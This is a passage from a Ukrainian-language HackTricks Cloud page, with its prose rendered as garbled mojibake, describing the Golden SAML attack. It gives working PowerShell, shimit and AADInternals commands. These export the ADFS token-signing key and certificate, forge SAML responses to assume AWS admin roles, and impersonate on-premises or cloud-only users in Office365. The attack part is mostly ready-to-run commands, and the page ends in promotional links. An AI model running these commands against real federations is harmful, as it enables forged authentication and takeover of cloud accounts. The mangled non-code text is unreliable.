* –Ü–º'—è —Å–µ–∞–Ω—Å—É —Ä–æ–ª—ñ –≤ AWS
* –Ü–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É Amazon

_–õ–∏—à–µ –ø—É–Ω–∫—Ç–∏, –≤–∏–¥—ñ–ª–µ–Ω—ñ –∂–∏—Ä–Ω–∏–º —à—Ä–∏—Ñ—Ç–æ–º, —î –æ–±–æ–≤'—è–∑–∫–æ–≤–∏–º–∏. –Ü–Ω—à—ñ –º–æ–∂–Ω–∞ –∑–∞–ø–æ–≤–Ω–∏—Ç–∏ –∑–∞ –±–∞–∂–∞–Ω–Ω—è–º._

–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è **–ø—Ä–∏–≤–∞—Ç–Ω–æ–≥–æ –∫–ª—é—á–∞** –Ω–µ–æ–±—Ö—ñ–¥–Ω–∏–π –¥–æ—Å—Ç—É–ø –¥–æ **–æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ AD FS**. –ü—ñ—Å–ª—è —Ü—å–æ–≥–æ –ø—Ä–∏–≤–∞—Ç–Ω–∏–π –∫–ª—é—á –º–æ–∂–Ω–∞ **–µ–∫—Å–ø–æ—Ä—Ç—É–≤–∞—Ç–∏ –∑ –æ—Å–æ–±–∏—Å—Ç–æ–≥–æ —Å—Ö–æ–≤–∏—â–∞** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ñ–≤, —Ç–∞–∫–∏—Ö —è–∫ [mimikatz](https://github.com/gentilkiwi/mimikatz). –î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è —ñ–Ω—à–æ—ó –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –º–æ–∂–Ω–∞ —Å–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏—Å—è snapin Microsoft.Adfs.Powershell –Ω–∞—Å—Ç—É–ø–Ω–∏–º —á–∏–Ω–æ–º, –ø–µ—Ä–µ–∫–æ–Ω–∞–≤—à–∏—Å—å, —â–æ –≤–∏ —É–≤—ñ–π—à–ª–∏ —è–∫ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á ADFS:
```powershell
# From an "AD FS" session
# After having exported the key with mimikatz

# ADFS Public Certificate
[System.Convert]::ToBase64String($cer.rawdata)

# IdP Name
(Get-ADFSProperties).Identifier.AbsoluteUri

# Role Name
(Get-ADFSRelyingPartyTrust).IssuanceTransformRule
```
–ó —É—Å—ñ—î—é —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—î—é –º–æ–∂–Ω–∞ –∑–∞–±—É—Ç–∏ –ø—Ä–æ –¥—ñ–π—Å–Ω–∏–π SAMLResponse —è–∫ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á, —è–∫–æ–≥–æ –≤–∏ —Ö–æ—á–µ—Ç–µ —É–æ—Å–æ–±–∏—Ç–∏, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ [**shimit**](https://github.com/cyberark/shimit)**:**
```bash
# Apply session for AWS cli
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012
# idp - Identity Provider URL e.g. http://server.domain.com/adfs/services/trust
# pk - Private key file full path (pem format)
# c - Certificate file full path (pem format)
# u - User and domain name e.g. domain\username (use \ or quotes in *nix)
# n - Session name in AWS
# r - Desired roles in AWS. Supports Multiple roles, the first one specified will be assumed.
# id - AWS account id e.g. 123456789012

# Save SAMLResponse to file
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012 -o saml_response.xml
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

### –õ–æ–∫–∞–ª—å–Ω–∞ –º–µ—Ä–µ–∂–∞ -> —Ö–º–∞—Ä–∞
```powershell
# With a domain user you can get the ImmutableID of the target user
[System.Convert]::ToBase64String((Get-ADUser -Identity <username> | select -ExpandProperty ObjectGUID).tobytearray())

# On AD FS server execute as administrator
Get-AdfsProperties | select identifier

# When setting up the AD FS using Azure AD Connect, there is a difference between IssueURI on ADFS server and Azure AD.
# You need to use the one from AzureAD.
# Therefore, check the IssuerURI from Azure AD too (Use MSOL module and need GA privs)
Get-MsolDomainFederationSettings -DomainName deffin.com | select IssuerUri

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate a user to to access cloud apps
Open-AADIntOffice365Portal -ImmutableID v1pOC7Pz8kaT6JWtThJKRQ== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
```
–¢–∞–∫–æ–∂ –º–æ–∂–ª–∏–≤–æ —Å—Ç–≤–æ—Ä–∏—Ç–∏ ImmutableID –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –ª–∏—à–µ —É —Ö–º–∞—Ä—ñ —Ç–∞ –≤–∏–¥–∞—î—Ç—å—Å—è –∑–∞ –Ω–∏—Ö.
```powershell
# Create a realistic ImmutableID and set it for a cloud only user
[System.Convert]::ToBase64String((New-Guid).tobytearray())
Set-AADIntAzureADObject -CloudAnchor "User_19e466c5-d938-1293-5967-c39488bca87e" -SourceAnchor "aodilmsic30fugCUgHxsnK=="

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate the user
Open-AADIntOffice365Portal -ImmutableID "aodilmsic30fugCUgHxsnK==" -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Desktop\ADFSSigningCertificate.pfx -Verbose
```
## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed)
* [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤.

</details>
